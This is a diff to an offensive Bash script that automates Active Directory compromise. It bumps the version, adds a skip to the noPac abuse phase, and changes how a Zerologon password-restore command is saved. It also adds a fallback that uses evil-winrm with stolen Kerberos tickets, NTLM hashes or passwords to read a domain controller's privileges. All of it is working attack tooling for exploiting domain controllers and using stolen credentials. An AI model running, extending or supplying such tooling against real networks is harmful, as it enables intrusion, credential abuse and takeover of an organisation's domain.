@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.23.0"
+readonly VERSION="1.23.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1276,6 +1276,7 @@ phase_cve_checks() {
 
 phase_nopac_abuse() {
     [[ "$HAVE_AUTH" != "1" || "$DO_ABUSE" != "1" ]] && return
+    [[ "$IS_DC_ADMIN" == "1" ]] && return        # already own the DC → nothing to escalate
     [[ -z "$DOMAIN" || -z "$USER" ]] && return
     have python3 || return
     local np; np="$(external_tool noPac/noPac.py)"
@@ -1396,7 +1397,7 @@ phase_zerologon_abuse() {
         else
             err "RESTORE FAILED after 3 tries! The DC secure channel is BROKEN — restore it NOW:"
             err "  python3 $rst '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass $orig_hex"
-            printf "python3 %q '%s/%s$@%s' -target-ip %s -hexpass %s\n" "$rst" "$DOMAIN" "$DC_HOST" "$DC_HOST" "$DC_IP" "$orig_hex" >"$OUTDIR/ZEROLOGON_RESTORE_COMMAND.txt"
+            echo "python3 '$rst' '$DOMAIN/$DC_HOST\$@$DC_HOST' -target-ip $DC_IP -hexpass $orig_hex" >"$OUTDIR/ZEROLOGON_RESTORE_COMMAND.txt"
         fi
     else
         err "Could not recover the original machine password (no Administrator hash / no LSA hex)."
@@ -1983,6 +1984,31 @@ analyze_privileges() {
     local priv_ok=0 grp_ok=0
     grep -qiE 'Se[A-Za-z]+Privilege|Privilege Name' <<<"$pr" && priv_ok=1
     grep -qiE 'Group Name|Mandatory Label|BUILTIN\\|NT AUTHORITY|S-1-[0-9]' <<<"$gr" && grp_ok=1
+
+    # Fallback: nxc's winrm -x is flaky under Kerberos (Python traceback / NTLMSSP
+    # parse error / empty), so it often can't read the token even though we DO have
+    # a shell. evil-winrm speaks WinRM cleanly (Kerberos with KRB5CCNAME+realm, or
+    # NTLM with -p/-H) — feed it the commands over stdin and re-parse. (No shell is
+    # spawned interactively; it runs the two commands and exits.)
+    if [[ "$priv_ok" == "0" ]] && have evil-winrm; then
+        subsection "Token read failed over nxc — retrying via evil-winrm"
+        local -a ev=(evil-winrm -i "${DC_FQDN:-$DCT}") evenv=()
+        if   [[ -n "$KERB_TICKET" ]]; then evenv=(env "KRB5CCNAME=$KERB_TICKET"); ev+=(-r "$DOMAIN")
+        elif [[ -n "$HASH" ]];       then ev+=(-u "$USER" -H "${HASH##*:}")
+        elif [[ -n "$PASS" ]];       then ev+=(-u "$USER" -p "$PASS")
+        fi
+        if [[ ${#evenv[@]} -gt 0 || " ${ev[*]} " == *" -u "* ]]; then
+            local eout; eout=$(printf 'whoami /priv\nwhoami /groups\nexit\n' \
+                               | timeout 60 "${evenv[@]}" "${ev[@]}" 2>/dev/null)
+            if grep -qiE 'Se[A-Za-z]+Privilege|Privilege Name' <<<"$eout"; then
+                pr="$eout"; gr="$eout"; priv_ok=1
+                grep -qiE 'Group Name|Mandatory Label|NT AUTHORITY|S-1-[0-9]' <<<"$eout" && grp_ok=1
+                printf '\n--- evil-winrm token read ---\n%s\n' "$eout" >>"$OUTDIR/whoami_priv_${USER}.txt"
+                ok "Token read via evil-winrm (whoami /priv + /groups)"
+            fi
+        fi
+    fi
+
     if [[ "$priv_ok" == "0" && "$grp_ok" == "0" ]]; then
         warn "Could not read the token over WinRM (exec failed/blocked) — privileges UNKNOWN, not empty (see whoami_priv_${USER}.txt)"
         return
@@ -2048,7 +2074,10 @@ phase_winrm_dpapi() {
                 ok "Shell:  evil-winrm -i $DC_FQDN -u $USER $( [[ -n "$HASH" ]] && echo "-H $HASH" || echo "-p '<pass>'" )"
             fi
             [[ "$winrm_err" == "1" ]] && info "(nxc's WinRM probe errored under Kerberos — access confirmed via group membership; use the evil-winrm line above)"
-            [[ "$winrm_err" == "0" ]] && analyze_privileges   # whoami /priv only works if nxc's winrm didn't choke
+            # Always try to read the token: analyze_privileges falls back to
+            # evil-winrm when nxc's winrm -x chokes (the Kerberos case), so we get
+            # whoami /priv + /groups even when winrm_err==1.
+            analyze_privileges
         elif [[ "$winrm_err" == "1" ]]; then
             warn "WinRM probe errored (known nxc Kerberos bug) and ${USER} isn't in Remote Management Users → assume no WinRM"
         else
